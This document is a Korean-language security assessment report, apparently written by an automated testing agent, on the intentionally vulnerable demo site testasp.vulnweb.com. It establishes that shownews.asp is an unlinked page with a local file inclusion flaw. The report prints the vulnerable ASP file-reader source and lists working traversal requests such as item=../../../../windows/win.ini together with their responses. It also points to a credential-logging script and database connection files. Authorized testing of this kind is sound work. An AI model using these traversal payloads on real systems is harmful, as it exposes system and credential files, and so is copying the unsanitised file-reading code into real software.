# /shownews.asp 정체·파라미터 규명 (Round 2, 읽기 전용)

- 대상: http://testasp.vulnweb.com/shownews.asp
- 방법: ① 확정된 LFI(Templatize.asp?item=)로 **자기 소스 열람(화이트박스)** → ② 확인된 파라미터만 무해값 투입 → ③ 소스 참조 / `_vti_cnf` 메타데이터로 관계 정리
- 총 요청 수: **37건** (GET only, POST 0건, 쓰기 0건)

## 1. 결론 한 줄

`shownews.asp` 는 **미링크 orphan 파일**이며, 내용은 `Templatize.asp` 의 파일읽기 블록을 **`Server.HTMLEncode()` 로 감싼 변형(402B)** 이다.
파라미터는 `item` **하나뿐**이고 의미는 `Templatize.asp` 와 완전히 동일하다 — **웹루트 기준 상대경로 임의 파일 읽기(두 번째 LFI 엔드포인트)**.
차이는 출력 인코딩뿐이다(원문 → HTML entity). 즉 **XSS 는 막히지만 traversal 은 안 막힌다.**

## 2. 화이트박스 소스 (LFI 로 추출, 402B — `vti_filesize:IR|402` 와 바이트 일치)

출처: `Templatize.asp?item=shownews.asp` (raw, 200/2991) + `shownews.asp?item=shownews.asp` (encoded, 200/456) → `html.unescape()` 복원
→ `src_shownews.asp.extracted`

```asp
<%
  Dim oFileSys, oFile
  'On Error Resume Next
  
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")  
  FName = Server.MapPath(".") & "\" & Request.QueryString("item") 
 
  Set oFile = oFileSys.OpenTextFile (FName, 1, False, 0) 
  
  If (IsObject(oFile)) Then
    'On Error Resume Next
    Response.Write Server.HTMLEncode(oFile.ReadAll)
    oFile.Close
  End If
%>
```

### Templatize.asp 와의 diff (lineage)

| 항목 | Templatize.asp | shownews.asp |
|---|---|---|
| 파일 크기 | 5993B (템플릿 boilerplate 포함) | **402B (ASP 블록만)** |
| 파라미터 | `Request.QueryString("item")` | 동일 |
| 경로 결합 | `Server.MapPath(".") & "\" & item` | 동일 |
| 출력 | `Response.Write(oFile.ReadAll)` (**raw**) | `Response.Write Server.HTMLEncode(oFile.ReadAll)` |
| 오류처리 | `'On Error Resume Next` (주석) | `'On Error Resume Next` (주석) |
| 응답 래퍼 | 有 (Dreamweaver 템플릿 boilerplate ~2.6KB 항상 출력) | **無 (파일 내용만)** |

→ `shownews.asp` 는 "Templatize 의 출력 인코딩 패치본" 계열. 두 파일의 `_vti_cnf` 타임스탬프·extenderversion 이 **완전 동일**(05 Oct 2007 10:01:19 / 4.0.2.8912)로 같은 배치 산출물이다.
`'On Error Resume Next` 두 줄이 주석 처리된 것도 개발 중 패치 흔적으로 보인다(해석, 미검증).

## 3. 파라미터 확정 — `item` (실측)

| 요청 | 결과 |
|---|---|
| `/shownews.asp` (무파라미터) | **500** 1208 (IIS 기본 오류) — 빈 값 → `MapPath(".")+"\"` = 디렉터리 → OpenTextFile 예외 |
| `/shownews.asp?item=` | 500 1208 (동일) |
| `/shownews.asp?file=html/about.html` | 500 1208 — **`file` 은 무시됨(`item` 만 유효)** |
| `/shownews.asp?item=html/about.html` | **200 2161** = about.html(1995B raw) 의 HTML 인코딩본 |
| `/shownews.asp?item=../../../../windows/win.ini` | **200 92** = win.ini 원문 그대로(인코딩 대상 `<` 없음) |
| `/shownews.asp?item=shownews.asp` | **200 456** = 자기 소스 HTML 인코딩 노출 |
| `/shownews.asp?item=nosuchfile_zzz.html` | 500 1208 (파일 부재) |
| `/shownews.asp?item=0` / `1` / `2` / `3` / `test` / `.` | **전부 500 1208** |

대조군(같은 세션에서 성공 보장):
`Templatize.asp?item=html/about.html` → 200 4594 · `Templatize.asp?item=../../../../windows/win.ini` → 200 2763
→ 요청 형식 검증 완료. 즉 위 500 들은 **차단이 아니라 파일 부재/디렉터리**.

**해석:** 정수·문자열 ID 의미론 없음. 경로만 받는다. `HTMLEncode` 때문에 응답 본문에서 `<`,`"`,`&` 가 entity 로 바뀌지만 **임의 파일 내용 유출 자체는 성립**(win.ini, .asp 소스 모두 획득).

### 응답 헤더 (`/shownews.asp?item=html/about.html`)
```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Content-Length: 2161
```
특이점 없음(리다이렉트 302 없음, Set-Cookie 는 평범한 ASPSESSIONID).

## 4. 관계 정리 — orphan 인가? 관련 unlinked 파일이 더 있나?

### (a) 소스 참조: 0건 (정적·동적 모두)
r1 에서 회수한 앱 소스(Default/Login/Logout/Search/Register/showforum/showthread/Templatize/db/DB/global.asa/web.config) 전체 + `/Templates/MainTemplate.dwt.asp`(200/2488, 모든 페이지의 실제 템플릿) 를 grep:
- `news` / `shownews` 문자열 **0건**.
- `MainTemplate.dwt.asp` 가 참조하는 대상: `../Default.asp`, `html/about.html`, `./Login.asp`, `./Register.asp`, `../Search.asp`, `../styles.css`, `../Templatize.asp` — shownews 없음.
→ **정적으로도, ASP 런타임으로도 링크되지 않는다. 진짜 orphan.**

### (b) `_vti_cnf/shownews.asp` (200/338B)
```
vti_timelastmodified:TR|05 Oct 2007 10:01:19 -0000
vti_extenderversion:SR|4.0.2.8912
vti_filesize:IR|402
vti_cachedlinkinfo:VX|      (空)
vti_cachedsvcrellinks:VX|   (空)
vti_backlinkinfo:VX|        (空)
```
→ 백링크 없음. `_vti_cnf/DB.asp`(338B)와 **filesize 라인만 다른 바이트 수준 동일** 메타데이터.

### (c) ★ 메타데이터 백링크 공백은 "orphan"의 필요조건이지 충분조건이 아니다
`_vti_cnf/logout.asp` 도 backlinkinfo 가 **비어 있지만**(338B, filesize 225) 실제로는 Default/Login/Search 등에서 `Response.Write("...Logout.asp...")` 로 **런타임 링크된다**(소스 8회 등장).
이유: FPSE 는 **정적 HTML 에 박힌 링크만** 캐시한다. ASP 코드로 생성되는 링크는 안 잡힌다.
따라서 판정은 반드시 **(a) 소스 grep + (b) 메타 백링크** 두 축을 함께 봐야 한다. shownews.asp 는 **둘 다 비어 있어** 진짜 orphan 으로 확정된다.

### (d) `_vti_cnf` 는 absence 오라클로 쓰면 안 된다 (반증)
- `/Templates/MainTemplate.dwt.asp` → **200/2488 (실존)** 인데 `/_vti_cnf/Templates/MainTemplate.dwt.asp` → 404, `/Templates/_vti_cnf/` → 404 (하위디렉터리 메타 없음).
- `/loginput.asp` → **200/0 (실존, db.asp 가 `<!--#INCLUDE FILE="logInput.asp"-->` 로 포함)** 인데 `/_vti_cnf/loginput.asp` → **404**.
→ `_vti_cnf` 404 를 "파일 없음"으로 읽으면 오판한다. 존재 확인은 직접 GET(또는 LFI)으로. **Round 1 의 _vti_cnf 인벤토리는 완전한 파일 목록이 아니다.**

### (e) 관련 파일 인벤토리 (기존 recon 재사용 + 소량 확인)
- 사이트 정수리 `_vti_cnf` 200: DB.asp, Default.asp, Login.asp, Search.asp, logout.asp, register.asp, showforum.asp, **shownews.asp**, showthread.asp, templatize.asp, styles.css (+ `Images/_vti_cnf/*`) = Round 1 의 12종.
- `/news.asp` → **404** (직접 GET). news 모듈 자체가 없다.
- 회수한 소스의 SQL 은 전부 포럼 스키마(`forums`/`threads`/`posts`/`users`)뿐 — **news 테이블 없음**.
→ `shownews.asp` 는 **현 스키마에 대응 데이터가 없는 잔존 파일**. 링크되지 않고(백링크 0), 받쳐줄 데이터 테이블도 없고, 템플릿/메뉴 어디에도 없다 → "지워지지 않고 남은 옛 날짜기/뉴스 리더"로 판단(해석).
- 실질적으로 함께 봐야 할 unlinked 파일: `loginput.asp`(200/0, 요청·자격증명 로거, `C:\scripts\logInput.txt` 쓰기 코드가 주석처리 상태), `db.asp`/`DB.asp`(200/0, `logInput.asp` include + 접속 문자열).

## 5. 정리

| 질문 | 답 |
|---|---|
| 정체 | Templatize.asp 의 파일리더 블록을 HTMLEncode 로 감싼 402B 짜리 orphan 페이지 |
| 파라미터 | **`item`** (QueryString, 상대경로). 다른 이름(`file`)은 무시 |
| 무파라미터 500 이유 | 빈 경로 → 디렉터리 OpenTextFile 예외 (`On Error Resume Next` 가 주석) — **"접근 통제"가 아님** |
| 동작 | 존재 파일 → 200 + HTML-encoded 내용 / 부재·디렉터리 → 500(1208B) |
| LFI 성립 | **예** (win.ini 92B 원문, .asp 소스 456B 노출) |
| XSS 성립 | 소스상 반사 XSS 는 `HTMLEncode` 로 차단(미검증 — 페이로드 미투입, 별도 담당) |
| orphan 인가 | **예**. 소스 참조 0건 + `_vti_cnf` 백링크 0건 (두 축 일치) |
| 관련 unlinked 파일 | `loginput.asp`(존재하나 메타 404), `db.asp`/`DB.asp`(링크 없음). `/news.asp` 는 부재 |

### 남은 것 / 미검증
- 반사 XSS 여부는 `HTMLEncode` 소스 근거로만 판단(페이로드 비투입 — 다른 자식 담당).
- `Templatize.asp` 와의 중복 여부(별도 finding vs 중복) 판단은 부모 몫: 원시 프리미티브는 동일하나 **엔드포인트·출력 인코딩·응답 래퍼가 다름**.
- 공개 사이트라 내용은 매일 초기화되므로 위 크기는 이번 스냅샷 기준.

<!-- 산출물: Round 2 / scratch/r2_shownews/ (읽기 전용, 쓰기·POST 0건) -->
